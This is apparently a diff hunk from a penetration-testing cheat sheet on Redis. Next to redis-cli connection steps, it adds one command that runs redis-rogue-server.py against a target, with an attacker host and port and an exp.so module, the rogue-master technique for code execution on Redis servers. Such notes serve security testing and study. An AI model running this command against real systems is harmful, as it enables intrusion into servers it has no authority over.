@@ -1764,6 +1764,7 @@ If password required:
 
 bash
 
+    ./redis-rogue-server.py --rhost <MIP> --lhost <VIP> --lport=6379 --exp exp.so
 redis-cli -h <IP> -p 6379 -a <password>
 Gather Information
 Inside redis-cli:
